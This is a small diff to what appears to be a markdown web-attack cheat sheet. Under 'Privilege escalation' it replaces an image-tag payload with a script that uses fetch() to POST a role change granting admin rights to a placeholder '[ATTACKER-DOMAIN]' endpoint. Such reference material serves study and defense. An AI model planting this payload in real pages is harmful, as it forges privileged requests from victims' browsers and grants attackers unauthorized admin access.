@@ -46,7 +46,12 @@
 
 - Privilege escalation
     ```html
-    <img src="https://[ATTACKER-DOMAIN]/change-role?user_id=1234&role=admin">
+    <script>
+    fetch('https://[ATTACKER-DOMAIN]/change-role', {
+        method: 'POST',
+        body: "user_id=1234&role=admin"
+    })
+    </script>
    ```
 
 ## WEB API abusing
